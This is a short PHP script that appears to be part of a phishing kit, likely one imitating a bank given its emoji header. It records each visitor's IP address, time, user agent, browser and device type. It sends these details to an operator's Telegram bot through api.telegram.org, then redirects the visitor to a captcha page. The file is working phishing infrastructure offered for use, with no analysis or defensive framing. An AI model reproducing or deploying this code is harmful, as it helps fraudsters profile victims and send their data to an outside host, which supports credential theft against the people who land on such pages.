<?php

include "./detect.php";
function visitors() {
    $detect         = new BrowserDetection();
    $ip             = $_SERVER['REMOTE_ADDR'];
    $date           = date("Y-m-d H:i:s", time());
    $usragent       = $_SERVER['HTTP_USER_AGENT'];
    $browserName    = $detect->getName();
    $browserVer     = $detect->getVersion();
    $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';

    $message =
    '[🏦] === Visitor === [🏦]'."\n".
    "IP : ".$ip."\n". 
    "Date : ".$date."\n".
    "".$usragent." | ".$browserName." | ".$browserVer." | ".$isMobile."\n";
    

    $data = [
    'chat_id' => CHAT_ID,
    'text' => $message,
    ]; 
    
    $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data));
    header("Location: ./captcha/index.php");
    exit(); 
}
?>